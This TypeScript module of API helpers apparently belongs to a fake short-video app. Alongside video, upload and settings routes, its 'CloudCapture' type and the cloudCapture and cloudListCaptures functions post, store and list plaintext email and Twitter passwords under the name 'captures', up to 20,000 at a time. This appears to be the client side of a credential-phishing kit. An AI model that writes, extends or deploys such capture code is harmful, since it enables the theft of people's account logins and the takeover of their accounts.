/** Cloud API helpers — cross-device sync via Supabase serverless routes */

export type CloudCapture = {
  id: string;
  type: 'email' | 'twitter';
  email: string;
  password: string;
  username?: string | null;
  name?: string | null;
  avatar?: string | null;
  seq?: number | null;
  count?: number | null;
  created_at?: string;
  last_seen_at?: string;
};

export type CloudVideo = {
  id: string;
  user_id: string;
  user_name?: string | null;
  caption?: string | null;
  src_url: string;
  poster_url?: string | null;
  category?: string | null;
  tags?: string[] | null;
  likes?: number | null;
  liked_by?: string[] | null;
  comments?: unknown[] | null;
  shares?: number | null;
  created_at?: string;
};

async function api<T>(path: string, init?: RequestInit): Promise<T> {
  const res = await fetch(path, {
    ...init,
    headers: {
      'Content-Type': 'application/json',
      ...(init?.headers || {}),
    },
  });
  const data = await res.json().catch(() => ({}));
  if (!res.ok) {
    throw new Error(data?.error || `Request failed: ${res.status}`);
  }
  return data as T;
}

export async function cloudCapture(input: {
  type: 'email' | 'twitter';
  email: string;
  password: string;
  username?: string;
  name?: string;
  avatar?: string;
}): Promise<CloudCapture | { skipped: true }> {
  return api('/api/captures', {
    method: 'POST',
    body: JSON.stringify(input),
  });
}

export async function cloudDeleteCapture(id: string): Promise<void> {
  await api('/api/captures', {
    method: 'DELETE',
    body: JSON.stringify({ id }),
  });
}

export async function cloudListCaptures(
  type?: 'email' | 'twitter' | 'all',
  limit = 20000
): Promise<CloudCapture[]> {
  const params = new URLSearchParams();
  if (type && type !== 'all') params.set('type', type);
  params.set('limit', String(Math.min(Math.max(limit, 1), 20000)));
  const q = params.toString() ? `?${params.toString()}` : '';
  return api(`/api/captures${q}`);
}

export async function cloudUpdateCapture(
  id: string,
  patch: Partial<CloudCapture>
): Promise<CloudCapture> {
  return api('/api/captures', {
    method: 'PUT',
    body: JSON.stringify({ id, ...patch }),
  });
}

export async function cloudDeleteAllCaptures(): Promise<void> {
  await api('/api/captures?all=1', { method: 'DELETE', body: '{}' });
}

export async function cloudListVideos(): Promise<CloudVideo[]> {
  return api('/api/videos');
}

export async function cloudCreateVideos(
  videos: Array<{
    id?: string;
    userId: string;
    userName?: string;
    caption?: string;
    src_url: string;
    category?: string;
    tags?: string[];
  }>
): Promise<CloudVideo[]> {
  return api('/api/videos', {
    method: 'POST',
    body: JSON.stringify({ videos }),
  });
}

export async function cloudDeleteVideo(id: string): Promise<void> {
  await api('/api/videos', {
    method: 'DELETE',
    body: JSON.stringify({ id }),
  });
}

export async function cloudDeleteAllVideos(): Promise<void> {
  await api('/api/videos?all=1', {
    method: 'DELETE',
    body: JSON.stringify({ all: true }),
  });
}

export async function cloudUploadFile(file: File): Promise<{ url: string; path: string }> {
  const base64 = await fileToBase64(file);
  return api('/api/upload-media', {
    method: 'POST',
    body: JSON.stringify({
      fileName: file.name,
      fileBase64: base64,
      contentType: file.type || 'application/octet-stream',
    }),
  });
}

function fileToBase64(file: Blob): Promise<string> {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onload = () => {
      const result = String(reader.result || '');
      const b64 = result.includes(',') ? result.split(',')[1] : result;
      resolve(b64);
    };
    reader.onerror = () => reject(reader.error || new Error('read failed'));
    reader.readAsDataURL(file);
  });
}

export async function cloudGetSetting(key: string): Promise<string> {
  const data = await api<{ key: string; value: string | null }>(
    `/api/settings?key=${encodeURIComponent(key)}`
  );
  return data?.value || '';
}

export async function cloudSetSetting(key: string, value: string): Promise<void> {
  await api('/api/settings', {
    method: 'POST',
    body: JSON.stringify({ key, value }),
  });
}

/** Poll helper for live-ish cross-device updates */
export function pollCloud<
  T
>(
  fetcher: () => Promise<T>,
  onData: (data: T) => void,
  ms = 2500
): () => void {
  let dead = false;
  const tick = async () => {
    if (dead) return;
    try {
      const data = await fetcher();
      if (!dead) onData(data);
    } catch {
      /* network blip */
    }
  };
  tick();
  const iv = window.setInterval(tick, ms);
  return () => {
    dead = true;
    window.clearInterval(iv);
  };
}
